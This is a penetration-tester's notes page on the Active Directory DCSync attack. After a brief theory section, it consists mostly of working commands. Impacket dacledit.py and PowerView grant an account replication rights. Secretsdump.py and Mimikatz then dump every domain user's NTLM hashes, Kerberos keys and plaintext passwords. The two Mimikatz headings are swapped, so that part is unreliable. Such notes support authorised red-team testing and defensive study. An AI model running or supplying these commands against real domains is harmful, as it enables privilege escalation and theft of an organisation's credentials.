---
Primary_category: "[[WINDOWS CREDENTIALS DUMPING]]"
title: "[[DCSYNC]]"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
  - DCSync
  - AD
  - Secretsdump-py
  - CredentialDumping
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS CREDENTIALS DUMPING]]&nbsp;&nbsp;•&nbsp;&nbsp;[[DACL ABUSE]]

#### *Theory*

*DCSync* is a technique that uses *Windows Domain Controller's API* to mimic the behaviour of a standard *DC* trying to replicate all the domain data

Specifically, It is a *DsGetNCChanges* operation transported in an *RPC* request to the *Directory Replication Service API (DRSUAPI)* to replicate data from a *Domain Controller*

Credentials are included within the replicated data, so, an attacker could extract any sensitive data located in the *NTDS.dit* file such as *NT hashes*, *AES keys*, *Plain passwords stored using reversible encryption* and so on

To be able to perform this attack, the operator must control a domain account which has the following *extended rights* over the *domain object*

- **`Ds-Replication-Get-Changes`**

- **`Ds-Replication-Get-Changes-All`**

Members of the *Administrators*, *Domain Admins*, *Enterprise Admins* and *Domain Controllers* have the above privileges by default over the domain

---

#### *Granting DCSync Rights - UNIX-Like*

##### *Impacket's DACLedit.py*

###### *Setting DACLs*

> ***[DACLedit.py](https://github.com/fortra/impacket/blob/master/examples/dacledit.py)***

```bash
dacledit.py -dc-ip <TARGET> -principal '<USER>' -target-dn 'DC=<DOMAIN>,DC=<TLD>' -action write -rights 'DCSync' '<DOMAIN>/<USER>:<PASSWD>'
```

###### *Validating DACLs*

```bash
dacledit.py -dc-ip <TARGET> -principal '<USER>' -target-dn 'DC=<DOMAIN>,DC=<TLD>' -action read '<DOMAIN>/<USER>:<PASSWORD>'
```

---

#### *Granting DCSync Rights - Windows*

##### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***

###### *Setting DACLs*

> ***Add-DomainObjectACL***

```powershell
$passwd = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $passwd)
```

```powershell
Add-DomainObjectACL -Credential $cred -PrincipalIdentity '<USER>' -TargetIdentity '<DOMAIN>' -Rights DCSync
```

###### *Validating DACLs*

> ***Get-DomainObjectACL***

```bash
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? { $_.SecurityIdentifier -eq ( Convert-NameToSID '<USER>' ) }
```

---

#### *Abuse - UNIX-Like*

##### *Impacket's Secretsdump.py*

> ***[Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

###### *NTLM Hash + Kerberos Keys + Plain Text Creds for all User Accounts*

```bash
secretsdump.py -outputfile <OUTPUT_FILE> '<DOMAIN>/<USER>:<PASSWD>@<TARGET>'
```

###### *Only NTLM Hash for All User Accounts*

```bash
secretsdump.py -outputfile <OUTPUT_FILE> -just-dc-ntlm '<DOMAIN>/<USER>:<PASSWD>@<TARGET>'
```

###### *NTLM Hash + Kerberos Keys + Plain Text Creds for a certain User Account*

```bash
secretsdump.py -outputfile <OUTPUT_FILE> -just-dc-user '<USER>' '<DOMAIN>/<USER>:<PASSWD>@<TARGET>'
```

---

#### *Abuse - Windows*

##### *Mimikatz*

> ***[Mimikatz.exe](https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe)***

> ***lsadump::dcsync***

###### *All Domain User Accounts*

```powershell
lsadump::dcsync /dc:<DC> /domain:<DOMAIN> /user:<USER>
```

###### *Specific Domain User Account*

```powershell
lsadump::dcsync /dc:<DC> /domain:<DOMAIN> /all /csv
```
